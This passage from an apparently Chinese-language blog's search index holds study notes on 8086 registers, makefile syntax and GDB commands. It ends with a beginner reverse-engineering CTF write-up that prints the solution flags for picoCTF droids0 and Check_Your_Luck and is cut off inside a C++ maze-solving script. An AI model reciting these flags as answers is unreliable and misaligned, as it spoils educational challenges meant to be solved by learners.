AX, [BX]     ; 将BX寄存器中存储的地址所对应的内存数据传送到AX寄存器</span><br><span class="line">MOV [BX], CX     ; 将CX寄存器的值传送到BX所指向的内存地址</span><br></pre></td></tr></table></figure><h2 id="CX寄存器"><a href="#CX寄存器" class="headerlink" title="CX寄存器"></a>CX寄存器</h2><p>​CX寄存器常用于计数器,用来在循环中(Loop)计数和存储计数值</p><p>​Loop &lt;标号&gt;命令执行时,会进行两步操作:</p><p>​1.(cx)&#x3D;(cx)-1;</p><p>​2.判断cx是否为0,如果为0则向下执行,否则跳转至标号处执行程序]</p><h2 id="DX寄存器"><a href="#DX寄存器" class="headerlink" title="DX寄存器"></a>DX寄存器</h2><p>​DX常用于存储数据或者作为数据传输的缓冲区,例如存储循环累加的值</p><h1 id="段寄存器"><a href="#段寄存器" class="headerlink" title="段寄存器"></a>段寄存器</h1><p>​在 8086 处理器中，共有四个段寄存器，它们是 CS (Code Segment)、DS (Data Segment)、SS (Stack Segment) 和 ES (Extra Segment),各个段寄存器的功能如下:</p><ol><li>CS (Code Segment)：指向代码段的起始地址，用于存储程序代码的位置。CS 寄存器中的内容加上指令的偏移地址，形成实际的物理地址，从而取得代码段中的指令。</li><li>DS (Data Segment)：指向数据段的起始地址，用于存储程序的全局数据和静态数据。DS 寄存器中的内容加上数据的偏移地址，形成实际的物理地址，从而访问数据段中的数据。</li><li>SS (Stack Segment)：指向栈段的起始地址，用于存储程序的运行时栈。SS 寄存器中的内容加上栈中数据的偏移地址，形成实际的物理地址，从而操作栈中的数据。</li><li>ES (Extra Segment)：额外段寄存器，用于存储其他数据段的起始地址。在特定情况下，程序可以使用 ES 寄存器来访问额外的数据段。</li></ol><p>参阅:</p><p>​<a href="https://blog.csdn.net/tju_zxl/article/details/128766360">https://blog.csdn.net/tju_zxl/article/details/128766360</a></p>]]></content>
      
      
      <categories>
          
          <category> 汇编 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 汇编 </tag>
            
            <tag> 寄存器 </tag>
            
            <tag> 8086 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>makefile的使用</title>
      <link href="/2023-07-29-8c1bed83c499/"/>
      <url>/2023-07-29-8c1bed83c499/</url>
      
        <content type="html"><![CDATA[<h1 id="makefile基本规则"><a href="#makefile基本规则" class="headerlink" title="makefile基本规则"></a>makefile基本规则</h1><p>一.格式:</p><p>​<strong>Target</strong> : Dependencies…</p><p>​Command…</p><p>​这即为一个规则,其中:</p><p>​1.Target 为目标,是规则的名字,也是make命令的入口.</p><p>​Target可以是目标文件—main.o main等等</p><p>​也可以是伪目标—并非真正要生成的文件,而是一个标签,不要和实际要生成的文件同名,一般为一个有意义的名字,可以描述其下Command命令功能的名字</p><p>​Target中一般只有一个文件;多个文件用空格分开,但是必须为相同类型的文件</p><p>​2.<strong>Dependencies</strong>为依赖文件列表</p><p>​例如main依赖main.o和hello.o,即为:</p><p>​main:main.o hello.o</p><p>​如果依赖文件一个都不写的话,那么只要输入make命令command命令就会执行</p><p>一般都将生成可执行文件的规则放在第一个,如下(?):</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230729190209136.png" alt="image-20230729190209136" style="zoom:33%;" /></p><p>如果不想将命令显示出来,在每条Command命令前都加上@即可:</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230729190236956.png" alt="image-20230729190236956" style="zoom:33%;" /></p><p>二.自动化变量</p><p>1.每一条规则都有互不冲突的变量:</p><table><thead><tr><th>$&lt;</th><th>规则的第一个依赖文件名</th></tr></thead><tbody><tr><td>$^</td><td>规则的所有依赖文件列表</td></tr><tr><td>$@</td><td>规则的目标文件名</td></tr></tbody></table><p>使用自动化变量可以简化规则的书写,例如:</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230729190322189.png" alt="image-20230729190322189" style="zoom: 33%;" /></p><p><strong>注意:自动化变量只能用于Command中,不能用于每个规则的第一行</strong></p><p>2.可以定义变量替代一系列文件名:</p><p>targets&#x3D;main.o add.o sub.o</p><p>该变量相当于全局变量,可以用在任何出现main.o add.o sub.o的地方</p><p>但是使用的时候写法为$(targets)而不能直接使用targets</p><p>一般只需要定义如下变量放于开头:</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230729190425899.png" alt="image-20230729190425899" style="zoom:33%;" /></p><p>分别为:最后可执行文件的变量;生成该可执行文件所需要的所有.o文件的变量;所有头文件的变量</p><h1 id="makefile的简化"><a href="#makefile的简化" class="headerlink" title="makefile的简化"></a>makefile的简化</h1><p>一.%.o:%.c</p><p>观察下面规则:</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230729190520197.png" alt="image-20230729190520197" style="zoom:33%;" /></p><p>可以使用</p><p>​%.o:%.c</p><p>​gcc -c $&lt; -o $@</p><p>来简化</p><p>%.o代表所有的.o文件,%.c代表所有的.c文件</p><p><strong>注意</strong>:尽管写在了一起,但是仍然是”只有发生改变的文件以及与该文件有依赖关系的文件才会重新编译”</p><h1 id="makefile隐含规则"><a href="#makefile隐含规则" class="headerlink" title="makefile隐含规则"></a>makefile隐含规则</h1><p>隐含规则是系统在makefile中已经写好的,隐含的一些规则</p><p>1.将.c文件编译生成.o文件</p><p>​make会自动推导出这种规则,并生成.o文件</p><p>​所以前面的规则可以写成:</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230729190606717.png" alt="image-20230729190606717" style="zoom:33%;" /></p><h1 id="存在多个makefile文件时执行哪一个"><a href="#存在多个makefile文件时执行哪一个" class="headerlink" title="存在多个makefile文件时执行哪一个"></a>存在多个makefile文件时执行哪一个</h1><p>1.make命令能够找到的makeflie文件只能是makefile或Makefile</p><p>​其他名字需要使用-f参数,例如:</p><p>​make -f makefile1</p><p>​make clean -f makefile1</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230729190646494.png" alt="image-20230729190646494" style="zoom:25%;" /></p>]]></content>
      
      
      <categories>
          
          <category> 知识库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tools </tag>
            
            <tag> makefile </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GDB调试的使用</title>
      <link href="/2023-07-29-c0fbb9744b11/"/>
      <url>/2023-07-29-c0fbb9744b11/</url>
      
        <content type="html"><![CDATA[<h1 id="GDB概述"><a href="#GDB概述" class="headerlink" title="GDB概述"></a>GDB概述</h1><h2 id="GDB组成架构"><a href="#GDB组成架构" class="headerlink" title="GDB组成架构"></a>GDB组成架构</h2><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/241-s2r1grmfpvr.png" alt="img" style="zoom:50%;" /><h2 id="基本工作原理"><a href="#基本工作原理" class="headerlink" title="基本工作原理"></a>基本工作原理</h2><p>gdb 通过系统调用 <code>ptrace</code> 来接管一个进程的执行。ptrace 系统调用提供了一种方法使得父进程可以观察和控制其它进程的执行，检查和改变其核心映像以及寄存器。它主要用来实现断点调试和系统调用跟踪。</p><h3 id="三种调试方式"><a href="#三种调试方式" class="headerlink" title="三种调试方式"></a>三种调试方式</h3><p>​直接运行并调试一个新进程</p><p>​运行并调试一个新进程</p><p>​运行 gdb，通过命令行或 <code>file</code> 命令指定目标程序。</p><p>​输入<code>run</code>命令， gdb 执行下面的操作：</p><p>​通过 <code>fork()</code> 系统调用创建一个新进程</p><p>​在新创建的子进程中执行操作：<code>ptrace(PTRACE_TRACEME, 0, 0, 0)</code></p><p>​在子进程中通过 <code>execv()</code> 系统调用加载用户指定的可执行文件</p><p>​attach并调试一个已经运行的进程</p><p>​用户确定需要进行调试的进程 PID</p><p>​运行 gdb，输入 <code>attach &lt;pid&gt;</code>，gdb 将对指定进程执行操作：<code>ptrace(PTRACE_ATTACH, pid, 0, 0)</code></p><p>​远程调试目标机上新创建的进程</p><p>​gdb 运行在调试机上，gdbserver 运行在目标机上，两者之间的通信数据格式由 gdb 远程串行协议（Remote Serial Protocol）定义</p><p>​RSP 协议数据的基本格式为： <code>$..........#xx</code></p><p>​gdbserver 的启动方式相当于运行并调试一个新创建的进程</p><h1 id="使用GDB前的准备"><a href="#使用GDB前的准备" class="headerlink" title="使用GDB前的准备"></a>使用GDB前的准备</h1><p>编译</p><p>​一般关闭-o优化选项</p><p>​打开-g调试选项</p><p>​-Wall打开所有warning</p><h1 id="GDB启动-x2F-退出-x2F-查看代码命令"><a href="#GDB启动-x2F-退出-x2F-查看代码命令" class="headerlink" title="GDB启动&#x2F;退出&#x2F;查看代码命令"></a>GDB启动&#x2F;退出&#x2F;查看代码命令</h1><p>启动退出</p><p>​gdb 可执行文件 —启动调试</p><p>​quit&#x2F;ctrl+d —退出</p><p>设置参数&#x2F;获取设置参数</p><p>​set args 10 20</p><p>​show args</p><p>GDB使用帮助</p><p>​help</p><p>查看当前文件代码</p><p>​list&#x2F;l —从默认位置显示</p><p>​list&#x2F;l &lt;行号&gt; —从制定的行显示</p><p>​list&#x2F;l &lt;函数名&gt; —从指定的函数开始显示</p><p>​disassemble&#x2F;disas —反汇编命令</p><p>​<code>disas &lt;func&gt;</code> 反汇编指定函数</p><p>​<code>disas &lt;addr&gt;</code> 反汇编某地址所在函数</p><p>​<code>disas &lt;begin_addr&gt; &lt;end_addr&gt;</code> 反汇编从开始地址到结束地址的部分</p><p>查看非当前文件代码</p><p>​list&#x2F;l &lt;文件名:行号&gt;</p><p>​list&#x2F;l &lt;文件名:函数名&gt;</p><p>设置显示的行数</p><p>​show list&#x2F;listsize</p><p>​set list&#x2F;listsize &lt;行数&gt;</p><p>其他</p><p>​pwd —显示工作目录</p><p>​shell —不离开gdb就能运行shell命令</p><p>​directory&#x2F;dir —设置查找源文件的路径(或者gdb的-d参数)</p><h1 id="GDB断点命令"><a href="#GDB断点命令" class="headerlink" title="GDB断点命令"></a>GDB断点命令</h1><p>设置断点</p><p>​b&#x2F;break &lt;行号&gt;</p><p>​b&#x2F;break &lt;函数名&gt;</p><p>​b&#x2F;break &lt;文件名:行号&gt;</p><p>​b&#x2F;break &lt;文件名:函数名&gt;</p><hr><p>​tbreak —临时断点,如同break,只不过在一次命中后被删除</p><p>查看断点</p><p>​i&#x2F;info b&#x2F;break</p><p>删除断点</p><p>​d&#x2F;del&#x2F;delete 断点编号</p><p>设置断点无效</p><p>​dis&#x2F;disable 断点编号</p><p>设置断点生效</p><p>​ena&#x2F;enable 断点编号</p><p>设置条件断点</p><p>​b&#x2F;break 10 if i&#x3D;&#x3D;5</p><h1 id="GDB调试运行命令"><a href="#GDB调试运行命令" class="headerlink" title="GDB调试运行命令"></a>GDB调试运行命令</h1><p>运行GDB</p><p>​start —停止于第一行</p><p>​run —运行到下一个断点</p><p>继续运行到下一个断点</p><p>​c&#x2F;continue</p><p>向下执行一段代码(不会进入函数体)</p><p>​n&#x2F;next</p><p>向下单步调试(遇到函数步进)</p><p>​s&#x2F;step —步进</p><p>​finish —运行直至跳出函数体</p><p>反向步进程序</p><p>​reverse-step [n] —反向步进程序,直到到达另一个源码行的开头,n表示执行n次,或某种原因程序停止</p><p>变量操作</p><p>​p&#x2F;print 变量名 —打印值</p><p>​ptype 变量名 —打印类型</p><p>自动变量操作</p><p>​display num —自动打印指定变量的值</p><p>​undisplay —取消…</p><p>​i&#x2F;info display</p><p>​undisplay 编号</p><p>其他操作</p><p>​until —跳出循环</p><p>​until &lt;行号&gt; —在函数内，进行指定位置跳转，执行完区间代码</p><h1 id="表达式监视-x2F-修改命令"><a href="#表达式监视-x2F-修改命令" class="headerlink" title="表达式监视&#x2F;修改命令"></a>表达式监视&#x2F;修改命令</h1><p>print &lt;表达式&gt; —对任意正确的表达式进行求值并打印</p><p>display &lt;表达式&gt; —每次单步进行指令后,紧接着输出被设置的表达式及值(单步运行非常有用)</p><p>watch &lt;表达式&gt; —设置一个监视点,一旦被监视的”表达式”的值改变,gdb将强行终止正在被调试的程序</p><p>​另外 <code>rwatch</code> 表示在访问时停止，<code>awatch</code> 表示在访问和改变时都停止</p><p>whatis —查询变量或函数</p><p>info &lt;函数&gt; —查询函数</p><p>info locals —查看当前堆栈页所有的变量</p><p>set var 变量名&#x3D;变量值 —修改变量的值</p><h1 id="特殊执行命令"><a href="#特殊执行命令" class="headerlink" title="特殊执行命令"></a>特殊执行命令</h1><p>运行代码</p><p>​call 函数(参数) —调用和执行函数</p><p>​return <expression> —取消函数调用的执行,expression被当做函数的返回值</p><p>生成代码</p><p>​make —不退出gdb就能重新产生可执行文件</p><h1 id="内存查看命令"><a href="#内存查看命令" class="headerlink" title="内存查看命令"></a>内存查看命令</h1><table><thead><tr><th>命令</th><th align="left">子选项</th><th>解释</th></tr></thead><tbody><tr><td>x</td><td align="left">x&#x2F;3 内存地址</td><td>需要显示的内存单元的个数，也就是说从当前地址向后显示几个内存单元的内容，一个内存单元的大小由后面的u定义</td></tr><tr><td></td><td align="left">x&#x2F;f 内存地址</td><td>f 表示显示的格式 ：  x 按十六进制格式显示变量。  d 按十进制格式显示变量。   u 按十进制格式显示无符号整型。   o 按八进制格式显示变量。   t 按二进制格式显示变量。   a 按十六进制格式显示变量。   i 指令地址格式   c 按字符格式显示变量。   f 按浮点数格式显示变量。</td></tr><tr><td></td><td align="left">x&#x2F;u 内存地址</td><td>u表示一个地址单元的长度    b表示单字节，    h表示双字节，    w表示四字节，    g表示八字节</td></tr><tr><td>举例</td><td align="left">x &#x2F;3dw 内存地址</td><td>打印3个四字节，按照10进制格式打印(即将上面各个部分组合起来)</td></tr></tbody></table><p>例如:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230729165808207.png" alt="image-20230729165808207"></p><p>这里打印了str[0]~str[15]的所有值(以16进制)</p><p>另外,使用 $ida(“xxx”)可以通过IDA名称获取地址,例如 $ida(“main”)  (?)</p><h1 id="堆栈和寄存器处理命令"><a href="#堆栈和寄存器处理命令" class="headerlink" title="堆栈和寄存器处理命令"></a>堆栈和寄存器处理命令</h1><p>bt —查看当前函数调用栈,即当前函数调用的上一层函数以及它们的调用栈信息</p><p>up&#x2F;down n —在堆栈中向上&#x2F;向下移动n层</p><p>frame n —切换到第n层堆栈</p><p>info相关的命令</p><p>​info frame —查看当前堆栈帧的信息，包括函数名、参数、返回地址等</p><p>​info args —查看当前函数的参数信息</p><p>​info locals —查看当前函数的局部变量信息</p><p>​info registers —查看所有寄存器的信息</p><p>print &#x2F;x $reg —以16进制格式查看指定寄存器reg的值</p><p>set $reg &#x3D; value —设置指定寄存器reg的值为value</p><h1 id="查询运行状态命令"><a href="#查询运行状态命令" class="headerlink" title="查询运行状态命令"></a>查询运行状态命令</h1><p>where&#x2F;bt —当前运行的堆栈列表(?)&#x2F;查看程序出错原因</p><p>bt backtrace —显示当前调用堆栈</p><p>up&#x2F;down —改变堆栈显示的深度</p><p>info program —查看程序的是否在运行，进程号，被暂停的原因</p><h1 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h1><p>1.GDB不会自动在程序入口点暂停,所以需要在执行前设置好断点</p><p>部分转载于:</p><p><a href="https://www.wenjiangs.com/doc/lkor5lfsdn#gdb-%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C"></a></p>]]></content>
      
      
      <categories>
          
          <category> 二进制 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> GDB </tag>
            
            <tag> tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>二进制作业第二周</title>
      <link href="/2023-07-28-ef74b2dbb74b/"/>
      <url>/2023-07-28-ef74b2dbb74b/</url>
      
        <content type="html"><![CDATA[<h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="droids0-pico2019"><a href="#droids0-pico2019" class="headerlink" title="droids0(pico2019):"></a>droids0(pico2019):</h2><p>这是一个安卓逆向的入门题(根本没有逆向,老样子在帮你部署环境),根据hint去安装了Android Studio</p><p>​资料:</p><p>​<a href="https://blog.csdn.net/weixin_43734793/article/details/124966390">https://blog.csdn.net/weixin_43734793/article/details/124966390</a></p><p>​<a href="https://blog.csdn.net/andylao62/article/details/23456881">https://blog.csdn.net/andylao62/article/details/23456881</a></p><h3 id="安装的一点点事情"><a href="#安装的一点点事情" class="headerlink" title="安装的一点点事情:"></a>安装的一点点事情:</h3><p>​1.电脑要有JDK5或之后的版本</p><p>​2.安装后的初始化出现网络问题,即无法访问插件网址,这里因为电脑有某lash,进行了手动的代理设置</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230728112025801.png" alt="image-20230728112025801" style="zoom:50%;" /></p><p>​正在疯狂解压↑</p><p>​<del>感觉和Jetbrain家风格好像(难道是一家的?)</del></p><p>​<del>怎么好多东西都是第一次使用要在线下载</del></p><h3 id="现在就直接运行一遍"><a href="#现在就直接运行一遍" class="headerlink" title="现在就直接运行一遍"></a>现在就直接运行一遍</h3><p>​根据提示了解到flag会在log中输出,直接运行就行:</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230728114115242.png" alt="image-20230728114115242" style="zoom: 25%;" /></p><p>​flag:   picoCTF{a.moose.once.bit.my.sister}</p><p>​虽然不是很懂,特别是连java都不会,但是好歹环境没问题</p><p>​<del>正解</del>到这里就结束了</p><h3 id="现在记录一点折腾的过程"><a href="#现在记录一点折腾的过程" class="headerlink" title="现在记录一点折腾的过程"></a>现在记录一点折腾的过程</h3><p>​<del>听说java中间会解释出某种叫做字节码的东西</del></p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230728114819343.png" alt="image-20230728114819343" style="zoom:50%;" /></p><p>​假装看懂↑</p><p>​不管如何,我们凭借着c++(学姬算鸡)的底子,了解到怎么也得是先找到main函数入口:</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230728114942680.png" alt="image-20230728114942680" style="zoom: 50%;" /></p><p>​然后虽然看不懂字节码,但是硬看…(主要是现在还没有去搞java逆向的工具…待会儿折腾…):</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230728115047864.png" alt="image-20230728115047864" style="zoom:50%;" /></p><p>​你发现了吗…再往下看,凭借我小学800词的英语底子我看到了这个:</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230728115206070.png" alt="image-20230728115206070" style="zoom:50%;" /></p><p>​看来是某个类方法,但是属实是不会看这字节码,也不了解java apk的变量结构(<del>那就学</del>):</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230728115525767.png" alt="image-20230728115525767" style="zoom:50%;" /></p><p>​经过学习某个叫做smail的东西,我们可以知道是调用了某个静态函数(不知道是全局函数还是静态成员方法—java有全局函数吗?),那么进一步分析语法去找参数吧</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230728120749186.png" alt="image-20230728120749186" style="zoom:50%;" /></p><p>​这东西为啥是空的…到此为止…字节码分析失败,以后还是得去看看java逆向,光有字节码不行</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230728120855903.png" alt="image-20230728120855903" style="zoom:50%;" /></p><p>​盲猜v0寄存器里存的就是flag的主体,跪求哪位椰叶如果知道这个做法有没有搞头,评论踢我一脚…</p><p>​</p><p>​到此为止吧,至少运行跑出来了…</p><h2 id="Check-Your-Luck"><a href="#Check-Your-Luck" class="headerlink" title="Check_Your_Luck"></a>Check_Your_Luck</h2><p>很显然是求解线性方程组…但是我手头没有代码(线代老师饶了我吧QWQ)</p><p>我们使用正则(我太懒了):</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">patt:</span><br><span class="line">\(v \* (-?[\d]+) \+ w \* (-?[\d]+) \+ x \* (-?[\d]+) \+ y \* (-?[\d]+) \+ z \* (-?[\d]+) \=\= (-?[\d]+)\)</span><br><span class="line">替换为:</span><br><span class="line">$1,$2,$3,$4,$5 $6\n</span><br></pre></td></tr></table></figure><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230728130450039.png" alt="image-20230728130450039" style="zoom: 50%;" /><p>处理后,丢入到在线计算线性方程组中(因为我没有写过求解线性方程组的代码—回头补上):</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230728130615285.png" alt="image-20230728130615285" style="zoom: 50%;" /></p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230728130824736.png" alt="image-20230728130824736" style="zoom:33%;" /></p><p>​现在直接组装起flag即可…或者运行一遍…</p><p>​flag{4544_123_677_1754_777}注意要换成NSSCTF{4544_123_677_1754_777}</p><p>​正则真是个好东西啊,怎么各位做题都不用捏?<del>(还是说椰叶们用了但WP里没写)</del></p><p>​结束…</p><h2 id="help"><a href="#help" class="headerlink" title="help"></a>help</h2><p>​代码都一看就懂,会生成一个map地图,动调提取出来,然后肉眼写吧(路径是wasd四个方向也一眼就看出来了)</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230728175513441.png" alt="image-20230728175513441" style="zoom:45%;" /><p>​处理脚本:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//BFS实现</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bitset&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> map2[] = &#123;</span><br><span class="line">        <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,</span><br><span class="line">        <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,</span><br><span class="line">        <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,</span><br><span class="line">        <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,</span><br><span class="line">        <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,</span><br><span class="line">        <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,</span><br><span class="line">        <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,</span><br><span class="line">        <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,</span><br><span class="line">        <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,</span><br><span class="line">        <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,</span><br><span class="line">        <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; 